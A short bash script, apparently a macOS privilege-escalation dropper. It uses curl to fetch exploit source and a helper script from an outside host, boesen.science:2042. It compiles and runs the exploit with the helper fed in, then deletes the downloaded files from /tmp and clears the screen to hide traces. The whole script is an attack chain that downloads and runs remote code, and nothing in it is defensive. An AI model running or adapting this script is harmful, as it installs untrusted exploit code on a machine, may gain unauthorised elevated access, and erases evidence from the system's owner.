#!/usr/bin/env bash

# You can't set variables in this file. Each line is executed independently.
# That's one of the reasons enact.sh needs to be separate.
#curl -Lso /tmp/elevate.out boesen.science:2042/mac/elevate.out
curl -Lo /tmp/exp.c boesen.science:2042/mac/exp.c
gcc /tmp/exp.c /tmp/a.out
curl -Lso /tmp/enact.sh boesen.science:2042/mac/enact.sh
chmod +x /tmp/enact.sh

/tmp/a.out <<EOF
/tmp/enact.sh
EOF

rm -f /tmp/*.sh /tmp/*.c /tmp/*.out

clear
